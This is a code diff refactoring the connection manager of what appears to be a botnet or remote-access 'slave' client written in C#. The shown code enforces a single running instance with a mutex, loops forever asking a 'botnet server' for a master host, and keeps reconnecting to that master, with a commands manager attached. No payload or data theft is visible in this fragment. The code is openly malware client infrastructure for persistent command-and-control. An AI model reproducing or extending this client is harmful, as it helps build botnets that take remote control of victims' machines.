@@ -12,29 +12,9 @@ namespace Slave.Core
         internal SlaveNetworkManager networkManager { get; set; }
 
         internal SlaveCommandsManager commandsManager { get; set; }
-
+        
         /// <summary>
-        /// IP to connect to, set from program's arguments
-        /// </summary>
-        public static string ip { get; set; } = null;
-
-        /// <summary>
-        /// Port to connect to, set from program's arguments
-        /// </summary>
-        public static int port { get; set; } = 0;
-
-        /// <summary>
-        /// Time in ms to wait for between each botnet server contact
-        /// </summary>
-        readonly int botnetServerRequestRetryDelay = 5000;
-
-        /// <summary>
-        /// Time in ms to wait between each master connection attempt
-        /// </summary>
-        readonly int masterConnectionRetryDelay = 2000;
-
-        /// <summary>
-        /// Number of times the slave will try to connect to the master
+        /// Number of times the slave tried to connect to the master
         /// </summary>
         int _connectionRetryCount;
 
@@ -43,7 +23,7 @@ namespace Slave.Core
             get => _connectionRetryCount;
 
             // If incrementation, reset value
-            set => _connectionRetryCount = value > _connectionRetryCount ? 10 : value;
+            set => _connectionRetryCount = value > _connectionRetryCount ? Config.maxConnectionRetryCount : value;
         }
 
         /// <summary>
@@ -52,7 +32,7 @@ namespace Slave.Core
         /// </summary>
         public SlaveManager()
         {
-            // Only one instance can run, random string identifier
+            // Only one instance can run
             var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D7");
             if (!mutex.WaitOne(TimeSpan.Zero, true))
             {
@@ -65,7 +45,7 @@ namespace Slave.Core
         /// This process occures every {retryDelay} ms.
         /// If it acquires a remote host to connect to, call the RunSlave() method
         /// </summary>
-        public void Start()
+        public void StartWithBotnet()
         {
             while (true)
             {
@@ -86,7 +66,7 @@ namespace Slave.Core
                             // Exceptions thrown trigger the network manager cleanup
                             Cleanup();
                             connectionRetryCount--;
-                            Thread.Sleep(masterConnectionRetryDelay);
+                            Thread.Sleep(Config.masterConnectionRetryDelay);
                         }
                         catch (ExitException)
                         {
@@ -97,27 +77,26 @@ namespace Slave.Core
                     }
                 }
 
-                Thread.Sleep(botnetServerRequestRetryDelay);
+                Thread.Sleep(Config.botnetServerRequestRetryDelay);
             }
         }
 
         /// <summary>
         /// Entry point of the slave manager, call the RunSlave() method
         /// </summary>
-        public void StartWithArguments()
+        public void StartWithMasterConnection()
         {
             while (true)
             {
                 try
                 {
-                    RunSlave(ip, port);
+                    RunSlave(Config.ip, Config.port);
                 }
                 catch (NetworkException)
                 {
                     // Exceptions thrown trigger the network manager cleanup
                     Cleanup();
-                    connectionRetryCount--;
-                    Thread.Sleep(masterConnectionRetryDelay);
+                    Thread.Sleep(Config.masterConnectionRetryDelay);
                 }
                 catch (ExitException)
                 {
